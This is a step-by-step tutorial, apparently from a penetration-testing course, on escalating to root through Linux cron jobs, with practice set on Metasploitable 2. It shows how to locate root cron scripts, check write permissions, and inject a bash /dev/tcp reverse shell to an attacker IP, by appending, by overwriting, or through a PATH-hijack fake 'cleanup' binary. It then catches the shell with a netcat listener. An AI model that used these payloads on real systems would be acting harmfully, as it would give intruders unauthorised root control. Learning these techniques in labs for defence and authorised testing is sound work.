# 03 — Cron Job Abuse

## What is a Cron Job?

A **cron job** is a scheduled task in Linux — like Windows Task Scheduler.

It runs commands or scripts **automatically at set times**. For example:
- Every minute: backup script runs
- Every day at midnight: log cleanup runs
- Every hour: health check script runs

Cron jobs are configured in a file called **crontab** (cron table).

---

## Why is This a Privilege Escalation Vector?

Many cron jobs are configured to run **as root** — because they need elevated privileges (backups, system tasks, etc.).

If a cron job runs a **script** as root, and **we can write to (modify) that script** — we can inject our own commands. Since the script runs as root, our injected commands also run as root.

This is the core idea:
```
Cron job runs as root → Executes a script → We own/can write that script → We inject a reverse shell → We get a root shell
```

---

## Step 1 — Find Cron Jobs

### Method A: System crontab

```bash
cat /etc/crontab
```

**What this does:** Shows the main system cron file. Example output:

```
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m  h  dom  mon  dow  user     command
*/1  *  *    *    *    root     /opt/scripts/backup.sh
```

**Reading the cron time format:**

| Field | Meaning | Value in example |
|-------|---------|-----------------|
| `m` | Minute | `*/1` = every 1 minute |
| `h` | Hour | `*` = every hour |
| `dom` | Day of month | `*` = every day |
| `mon` | Month | `*` = every month |
| `dow` | Day of week | `*` = every day of week |
| `user` | Run as this user | `root` |
| `command` | What to run | `/opt/scripts/backup.sh` |

So this runs `/opt/scripts/backup.sh` **as root every minute**.

---

### Method B: Other cron directories

```bash
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

**What these are:** Directories where programs drop their own cron job files. Check them all.

---

### Method C: Process monitoring (advanced)

Sometimes cron jobs don't appear in crontab but still run. You can catch them by watching processes:

```bash
watch -n 1 "ps aux | grep -v grep"
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `watch -n 1` | Run the following command every 1 second |
| `ps aux` | List all running processes |
| `grep -v grep` | Exclude the grep process itself from results |

Wait for 1-2 minutes and watch if any new process appears.

---

## Step 2 — Check if the Script is Writable

Once you find a cron job running a script as root, check if you can write to it:

```bash
ls -la /opt/scripts/backup.sh
```

**Example output:**
```
-rwxrwxrwx 1 root root 45 Jan 10 12:00 /opt/scripts/backup.sh
     ^
     'w' for others = anyone can write to this file!
```

**Permission breakdown:**
```
-  rwx  rwx  rwx
   ^    ^    ^
   owner group others
```

If `others` has `w` (write), you can modify this file even though root owns it.

---

### What if the script doesn't exist?

Sometimes the cron job references a **script that doesn't exist yet** — but the directory is writable. You can **create** the script!

```bash
ls -la /opt/scripts/
# Check if directory is writable
```

---

## Step 3 — Inject a Reverse Shell

Once you confirm you can write to the script, inject a reverse shell payload:

### Method A: Append reverse shell to the script

```bash
echo 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1' >> /opt/scripts/backup.sh
```

**Breaking down this command:**

| Part | Meaning |
|------|---------|
| `echo '...'` | Print the text |
| `>>` | Append to the file (don't overwrite, add at end) |
| `bash -i` | Start an interactive bash shell |
| `>&` | Redirect output and errors |
| `/dev/tcp/IP/PORT` | Linux's built-in TCP connection feature — connects to your IP and port |
| `0>&1` | Redirect stdin (input) to the same place as stdout (so you can type commands) |

---

### Method B: Replace entire script with reverse shell

```bash
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1' >> /opt/scripts/backup.sh
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `echo '#!/bin/bash'` | Shebang line — tells system to use bash to run this script |
| `>` | Overwrite (replace entire file) |
| Second echo with `>>` | Append the reverse shell payload |

---

## Step 4 — Set Up a Listener on Kali

Before the cron job runs, you need to be listening for the incoming connection:

```bash
nc -lvnp 4444
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `nc` | Netcat — a networking tool |
| `-l` | Listen mode (wait for connections) |
| `-v` | Verbose (show connection details) |
| `-n` | No DNS resolution (faster) |
| `-p 4444` | Listen on port 4444 |

---

## Step 5 — Wait for the Cron Job to Run

If the cron runs every minute (`*/1 * * * *`), wait up to 1 minute. When it triggers:

```
connect to [YOUR_KALI_IP] from (UNKNOWN) [TARGET_IP] 44231
bash: no job control in this shell
root@metasploitable:~#
```

You now have a root shell.

---

## Step 6 — Verify

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

---

## PATH Abuse in Cron (Bonus Technique)

Sometimes a cron job calls a command **without its full path**:

```bash
# In /etc/crontab:
* * * * * root cleanup
```

Instead of `/usr/bin/cleanup`, it just calls `cleanup`. Linux searches the **PATH** variable to find it.

If you can write to a directory that appears **before** the real binary in PATH, you can create a fake `cleanup` script:

```bash
# Check crontab PATH
cat /etc/crontab
# PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# If /usr/local/sbin is writable:
echo '#!/bin/bash' > /usr/local/sbin/cleanup
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /usr/local/sbin/cleanup
chmod +x /usr/local/sbin/cleanup
```

When cron runs `cleanup`, it finds your fake one first.

---

## Practice on Metasploitable 2

```bash
# After getting shell:
cat /etc/crontab

# Check permissions of any scripts listed
ls -la /path/to/script

# If writable, inject reverse shell
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /path/to/script

# Set up listener on Kali
nc -lvnp 4444

# Wait for cron to fire
```

---

## Summary

```
1. cat /etc/crontab              → Find scheduled root jobs
2. ls -la /path/to/script        → Check if writable
3. echo 'reverse shell' >> script → Inject payload
4. nc -lvnp 4444 (on Kali)       → Set up listener
5. Wait for cron to fire         → Catch root shell
6. Verify: id / whoami
```
